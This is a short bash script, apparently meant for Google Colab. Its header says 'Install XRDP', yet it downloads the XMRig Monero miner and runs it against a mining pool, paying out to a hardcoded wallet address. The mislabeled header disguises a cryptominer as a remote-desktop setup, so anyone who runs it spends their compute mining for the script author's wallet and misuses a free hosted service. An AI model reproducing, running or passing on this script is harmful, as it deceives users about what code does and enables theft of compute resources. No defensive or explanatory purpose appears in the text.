#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 84KDNzV1stzXpAdFC9T2MSEyqDcqmwLirbiJ48LUyZ9xUCnzGaidddD5TDqgdCQLL6U7dQda2M9VX678zR1e7mACKv3GN2U -k --tls --rig-id XMR1
